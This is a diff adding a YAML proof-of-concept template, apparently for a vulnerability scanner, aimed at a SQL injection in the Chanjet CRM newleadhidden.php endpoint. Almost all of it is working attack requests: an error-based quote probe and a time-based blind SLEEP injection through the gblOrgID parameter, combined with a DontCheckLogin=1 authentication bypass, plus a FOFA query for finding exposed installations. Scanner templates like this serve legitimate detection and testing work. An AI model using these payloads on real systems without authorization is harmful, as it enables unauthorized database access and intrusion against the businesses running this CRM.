@@ -1,0 +1,31 @@
+id: poc-yaml-changjie-crm-newleadhidden-php-sqli
+info:
+  name: 畅捷通CRM newleadhidden.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通CRM
+  fofa: app="畅捷通-畅捷CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /lead/newleadhidden.php?gblOrgID=1'&DontCheckLogin=1
+  expression: status_code == 200 && contains(body,"Fatal error")
+- method: GET
+  path: /lead/newleadhidden.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP({{.t1}})))HAjH)--+-&DontCheckLogin=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"select\":") &&
+
+    contains(body,"Lead") &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
